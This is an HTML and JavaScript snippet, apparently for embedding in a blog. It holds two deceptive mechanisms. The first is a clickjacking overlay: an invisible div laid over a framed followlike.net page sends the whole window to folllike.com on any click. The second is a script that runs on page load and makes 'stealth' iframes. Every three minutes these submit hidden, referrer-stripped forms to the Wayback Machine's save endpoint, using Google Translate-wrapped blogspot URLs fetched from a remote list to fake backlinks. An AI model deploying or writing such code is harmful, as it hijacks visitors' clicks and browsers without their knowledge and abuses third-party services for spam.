<link href='https://trafficgenerator.github.io/api/custom-frame-styles.css' rel='stylesheet'/>

<div id="container">
<iframe id="fullIframe" src="https://www.followlike.net/?r=19384926"></iframe>
<div id="clickCatcher"></div>
</div>

<script>
      document.getElementById("clickCatcher").addEventListener("click", function () {
        	//window.location.href = "http://folllike.com/?19384926";
		
		    // Changes top window; will throw if cross-origin
		    top.location.href = 'http://folllike.com/?19384926';
		    // or to replace current history:
		    // top.location.replace('http://folllike.com/?19384926');
      });
</script>
<!---------------------------------------------------------->



<!---------------------------------------------------------->

<div id="stealthIFrameContainer"></div>
<script>
const googleTranslateUrls = [
	"https://translate.google.com/translate?sl=auto&tl={{LANGUAGE_CODES}}&hl=en-US&u=https://{{SUBDOMAIN}}.blogspot.com/&client=webapp",
	"https://{{SUBDOMAIN}}-blogspot-com.translate.goog/?_x_tr_sl=auto&_x_tr_tl={{LANGUAGE_CODES}}&_x_tr_hl=en-US&_x_tr_pto=wapp"
];

const languageCodes = [
	"sn",
	"ach",
	"en",
	"da",
	"ab",
	"ace",
	"ach",
	"aa",
	"af",
	"sq",
	"alz",
	"am",
	"ar",
	"hy",
	"as",
	"av",
	"awa",
	"ay",
	"az",
	"ban",
	"bal",
	"bm",
	"bci",
	"ba",
	"eu",
	"btx",
	"bts",
	"bbc",
	"be",
	"bem",
	"bn",
	"bew",
	"bho",
	"bik",
	"bs",
	"br",
	"bg",
	"bua",
	"yue",
	"ca",
	"ceb",
	"ch",
	"ce",
	"ny",
	"zh-CN",
	"zh-TW",
	"chk",
	"cv",
	"co",
	"crh",
	"crh-Latn",
	"hr",
	"cs",
	"da",
	"fa-AF",
	"dv",
	"din",
	"doi",
	"dov",
	"nl",
	"dyu",
	"dz",
	"en",
	"eo",
	"et",
	"ee",
	"fo",
	"fj",
	"tl",
	"fi",
	"fon",
	"fr",
	"fr-CA",
	"fy",
	"fur",
	"ff",
	"gaa",
	"gl",
	"ka",
	"de",
	"el",
	"gn",
	"gu",
	"ht",
	"cnh",
	"ha",
	"haw",
	"iw",
	"hil",
	"hi",
	"hmn",
	"hu",
	"hrx",
	"iba",
	"is",
	"ig",
	"ilo",
	"id",
	"iu-Latn",
	"iu",
	"ga",
	"it",
	"jam",
	"ja",
	"jw",
	"kac",
	"kl",
	"kn",
	"kr",
	"pam",
	"kk",
	"kha",
	"km",
	"cgg",
	"kg",
	"rw",
	"ktu",
	"trp",
	"kv",
	"gom",
	"ko",
	"kri",
	"ku",
	"ckb",
	"ky",
	"lo",
	"ltg",
	"la",
	"lv",
	"lij",
	"li",
	"ln",
	"lt",
	"lmo",
	"lg",
	"luo",
	"lb",
	"mk",
	"mad",
	"mai",
	"mak",
	"mg",
	"ms",
	"ms-Arab",
	"ml",
	"mt",
	"mam",
	"gv",
	"mi",
	"mr",
	"mh",
	"mwr",
	"mfe",
	"chm",
	"mni-Mtei",
	"min",
	"lus",
	"mn",
	"my",
	"nhe",
	"ndc-ZW",
	"nr",
	"new",
	"ne",
	"bm-Nkoo",
	"no",
	"nus",
	"oc",
	"or",
	"om",
	"os",
	"pag",
	"pap",
	"ps",
	"fa",
	"pl",
	"pt",
	"pt-PT",
	"pa",
	"pa-Arab",
	"qu",
	"kek",
	"rom",
	"ro",
	"rn",
	"ru",
	"se",
	"sm",
	"sg",
	"sa",
	"sat-Latn",
	"sat",
	"gd",
	"nso",
	"sr",
	"st",
	"crs",
	"shn",
	"sn",
	"scn",
	"szl",
	"sd",
	"si",
	"sk",
	"sl",
	"so",
	"es",
	"su",
	"sus",
	"sw",
	"ss",
	"sv",
	"ty",
	"tg",
	"ber-Latn",
	"ber",
	"ta",
	"tt",
	"te",
	"tet",
	"th",
	"bo",
	"ti",
	"tiv",
	"tpi",
	"to",
	"lua",
	"ts",
	"tn",
	"tcy",
	"tum",
	"tr",
	"tk",
	"tyv",
	"ak",
	"udm",
	"uk",
	"ur",
	"ug",
	"uz",
	"ve",
	"vec",
	"vi",
	"war",
	"cy",
	"wo",
	"xh",
	"sah",
	"yi",
	"yo",
	"yua",
	"zap",
	"zu"
];
  
/* Instrumented version of your script â€” paste in place of old script */
const fetchData = [
  "https://smartbacklinkmaker.blogspot.com/"
];
const fetchURLs = [
  "https://backlink-generator-tool.github.io/url-dump-json/url/custom-urls/backlink-generator.json"
];
const WAYBACK_SAVE_ENDPOINT = "https://web.archive.org/save/{{URL}}";
const IFRAME_COUNT = 4;
const SUBMIT_INTERVAL = 60000*3;

// Simple URL check (basic regex)
function isValidURL(url) {
    const pattern = /^https?:\/\/[^\s]+$/i;
    return pattern.test(url);
}

function shuffle(array){ for(let i=array.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[array[i],array[j]]=[array[j],array[i]];} }
function normalizeURL(url){ if(typeof url!=='string') return ""; return url.replace(/([^:]\/)\/+/g,"$1"); }
function randomURL(array){ return array[Math.floor(Math.random()*array.length)]; }

async function updateDefaultURLs() {
  shuffle(fetchURLs);

  for (const u of fetchURLs) {
    try {
      console.log("ðŸ”Ž Trying to fetch URL list from:", u);

      const r = await fetch(u);
      if (!r.ok) throw new Error("HTTP " + r.status);

      const data = await r.json();

      if (Array.isArray(data) && data.length) {
        // Filter only blogspot.com URLs
        const blogspotOnly = data.filter(url => {
          try {
            const host = new URL(url).hostname;
            return host === "blogspot.com" || host.endsWith(".blogspot.com");
          } catch {
            return false; // skip invalid URLs
          }
        });

        if (blogspotOnly.length) {
          fetchData.length = 0;
          fetchData.push(...blogspotOnly);

          console.log(
            "âœ… Loaded",
            blogspotOnly.length,
            "Blogspot URLs from",
            u
          );
          return;
        }
      }
    } catch (err) {
      console.warn("âš  Failed to load", u, err?.message);
    }
  }

  console.warn("âš  Using fallback URLs:", fetchData.length);
}


function getSubdomain(url) {
  const hostname = new URL(url).hostname;          // linkboosttool.blogspot.com
  const parts = hostname.split('.');               // ["linkboosttool", "blogspot", "com"]

  // return first part only (the subdomain)
  return parts.length > 2 ? parts[0] : null;
}

/*
function generateTargetURL() {
  if (!fetchData.length) return "";
  const url1 = randomURL(fetchData);
  const url2 = randomURL(fetchData);
  const combined = url1 + "?" + url2;
  return normalizeURL(combined);
}
*/
  
function generateTargetURL() {
	const languageCode  = randomURL(languageCodes);
	const translateUrl  = randomURL(googleTranslateUrls).replace(/{{LANGUAGE_CODES}}/g, languageCode)
	
    const url = randomURL(fetchData);
	const subdomain = getSubdomain(url);
	
	const submitUrl = translateUrl.replace(/{{SUBDOMAIN}}/g, subdomain);

    return submitUrl;
}

  

function submitToWaybackInFrame(iframe) {
  try {
    const targetUrl = generateTargetURL();
    if (!targetUrl || !isValidURL(targetUrl)) {
      console.warn("âš  Skipping invalid target:", targetUrl);
      return;
    }
    const form = document.createElement("form");
    form.style.display = "none";
    form.target = iframe.name;
    form.method = "POST";
    form.action = WAYBACK_SAVE_ENDPOINT;
	form.referrerPolicy = "no-referrer";
    form.className = "web-save-form";
    const input = document.createElement("input");
    input.type = "hidden";
    input.name = "url";
    input.value = targetUrl;
    form.appendChild(input);
    document.body.appendChild(form);

    console.log("ðŸ“¨ Submitting to Wayback in frame:", iframe.name, "target URL:", targetUrl);
    form.submit();

    // remove after a short delay to be safe
    setTimeout(() => {
      try { form.remove(); } catch(e) { /* ignore */ }
    }, 1000);
  } catch (err) {
    console.error("âŒ submitToWaybackInFrame error:", err);
  }
}

function createIframe(i) {
  try {
    const iframe = document.createElement("iframe");
    const fname = "hiddenFrame" + i;
    iframe.setAttribute("name", fname);
    iframe.setAttribute("id", fname);
    iframe.classList.add("hidden-iframe");
    // make it visible for debugging â€” remove border later if you want hidden
    iframe.style.width = "100%";
    iframe.style.height = "200px";
    iframe.style.border = "2px dashed red"; // debug border â€” remove or change to display:none if desired
    iframe.src = "about:blank";

    const container = document.getElementById("stealthIFrameContainer");
    container.appendChild(iframe);

    // wait a little so iframe is attached, then submit
    setTimeout(() => submitToWaybackInFrame(iframe), 250);

    setInterval(() => {
      console.log("â± Interval firing for iframe:", fname);
      submitToWaybackInFrame(iframe);
    }, SUBMIT_INTERVAL);
  } catch (err) {
    console.error("âŒ createIframe error:", err);
  }
}

/* Ensure container exists (defensive) */
if (!document.getElementById("stealthIFrameContainer")) {
  const c = document.createElement("div");
  c.id = "stealthIFrameContainer";
  document.body.appendChild(c);
  console.log("âž• Created missing stealthIFrameContainer.");
}

/* Run startup after DOM ready */
document.addEventListener('DOMContentLoaded', async () => {
  try {
    await updateDefaultURLs();
  } catch (e) {
    console.warn("updateDefaultURLs() failed:", e && e.message);
  }

  for (let i = 0; i < IFRAME_COUNT; i++) createIframe(i);
});
</script>
